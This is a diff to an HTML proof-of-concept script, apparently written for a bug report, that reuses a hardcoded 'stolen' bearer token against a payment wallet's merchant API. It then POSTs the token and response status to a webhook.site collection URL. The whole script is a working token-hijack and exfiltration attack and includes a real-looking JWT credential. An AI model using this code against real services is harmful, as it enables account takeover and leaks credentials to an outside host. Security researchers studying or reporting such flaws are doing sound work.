@@ -1,27 +1,34 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>PoC: Token Hijack to Exfil Merchant Data</title>
-</head>
-<body>
-  <h1>PoC: Bearer Token Hijack</h1>
-  <p>Open console for exfil test...</p>
-
 <script>
-  alert("✅ Script loaded!");
   console.log("💡 Script started");
 
-  document.body.style.backgroundColor = "#ffdddd"; // Visual test
+  const stolenToken = "Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoyMjQxNDA2N30.fhIjbSJy6YqifI60URimGdVwPK3t_cM70AUXklvcaSXOoVYDjoNtDpleWEP9h3FCS0ZuSM7k8cY5D6Jfdb_DOA";
 
-  fetch("https://webhook.site/cfb89b16-1571-4db3-b282-adc26a5c8f57", {
-    method: "POST",
+  fetch("https://pay.wallet.tg/wpay/website-api/v1/merchant", {
+    method: "GET",
     headers: {
-      "Content-Type": "application/json"
-    },
-    body: JSON.stringify({ message: "PoC test triggered" })
+      "Authorization": stolenToken,
+      "Accept": "application/json"
+    }
+  })
+  .then(response => {
+    console.log("✅ Request sent. Status:", response.status);
+
+    // Just confirm it ran, don't wait for webhook
+    return fetch("https://webhook.site/cfb89b16-1571-4db3-b282-adc26a5c8f57", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        tokenUsed: stolenToken,
+        message: "Token was reused in cross-origin fetch.",
+        status: response.status
+      })
+    }).then(() => {
+      console.log("📡 Webhook POST sent (browser may block response due to CORS).");
+    });
+  })
+  .catch(err => {
+    console.error("❌ Something went wrong:", err);
   });
 </script>
-  
-</body>
-</html>
